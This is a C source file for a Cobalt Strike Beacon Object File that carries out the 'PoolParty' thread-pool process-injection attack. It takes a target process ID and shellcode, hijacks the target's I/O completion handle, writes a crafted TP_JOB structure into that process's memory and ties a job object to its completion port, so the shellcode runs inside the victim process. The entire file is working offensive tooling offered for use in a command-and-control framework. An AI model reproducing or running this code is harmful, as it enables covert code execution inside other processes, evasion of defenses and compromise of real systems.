#include <windows.h>
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;
#define JOB_NAME_LENGTH 8
unsigned char POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH + 1];

HANDLE HijackIoCompletionProcessHandle(HANDLE p_hTarget) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle() {
    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
    BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Hijacked I/O completion handle from the target process: %x", p_hIoCompletion);
    return p_hIoCompletion;
}

char generateRandomLetter() {
    int randomNumber = MSVCRT$rand() % 26;
    char randomLetter = 'A' + randomNumber;
    return randomLetter;
}

void RemoteTpJobInsertionSetupExecution() {
	MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
	for (int i = 0; i < JOB_NAME_LENGTH; ++i) {
        POOL_PARTY_JOB_NAME[i] = generateRandomLetter();
    }
    POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH] = '\0';

	_TpAllocJobNotification TpAllocJobNotification = (_TpAllocJobNotification)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocJobNotification"));
	HANDLE p_hJob = KERNEL32$CreateJobObjectA(NULL, POOL_PARTY_JOB_NAME);
	if (p_hJob == NULL) {
		BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Failed to create job object with name %s", POOL_PARTY_JOB_NAME);
		return;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Created job object with name `%s`", POOL_PARTY_JOB_NAME);

	PFULL_TP_JOB pTpJob = { 0 };
	NTSTATUS Ntstatus = TpAllocJobNotification(&pTpJob, p_hJob, m_ShellcodeAddress, NULL, NULL);
	if (!NT_SUCCESS(Ntstatus)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	TpAllocJobNotification Failed!");
		return;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Created TP_JOB structure associated with the shellcode");

	PFULL_TP_JOB RemoteTpJobAddress = (PFULL_TP_JOB)(KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Allocated TP_JOB memory in the target process: %p", RemoteTpJobAddress);
	KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), NULL);
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Written the specially crafted TP_JOB structure to the target process");

	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
	KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Zeroed out job object `%s` IO completion port", POOL_PARTY_JOB_NAME);

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = m_p_hIoCompletion;
	KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Associated job object `%s` with the IO completion port of the target process worker factory", POOL_PARTY_JOB_NAME);

	KERNEL32$AssignProcessToJobObject(p_hJob, KERNEL32$GetCurrentProcess());
	BeaconPrintf(CALLBACK_OUTPUT,"[INFO] 	Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory", POOL_PARTY_JOB_NAME);
}

void HijackHandles() {
	m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle();
}

void Inject() {
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	WriteShellcode();
	RemoteTpJobInsertionSetupExecution();
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    m_szShellcodeSize = BeaconDataLength(&parser);
    m_cShellcode = BeaconDataExtract(&parser, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
	Inject();
}